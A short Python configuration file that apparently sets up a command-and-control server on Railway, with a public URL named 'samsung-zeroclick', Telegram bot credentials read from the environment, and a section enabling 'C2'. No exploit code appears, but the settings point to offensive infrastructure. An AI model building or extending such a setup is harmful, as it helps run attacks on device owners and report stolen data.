# config.py

import os

# Railway port
PORT = int(os.environ.get("PORT", 8080))

# Public URL
RAILWAY_PUBLIC_URL = os.environ.get("RAILWAY_PUBLIC_URL", "")
if not RAILWAY_PUBLIC_URL:
    RAILWAY_PUBLIC_URL = "https://samsung-zeroclick-production.up.railway.app"

# Telegram
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID = os.environ.get("CHAT_ID", "")

# C2
C2_HOST = "0.0.0.0"
C2_PORT = PORT
C2_ENABLED = True
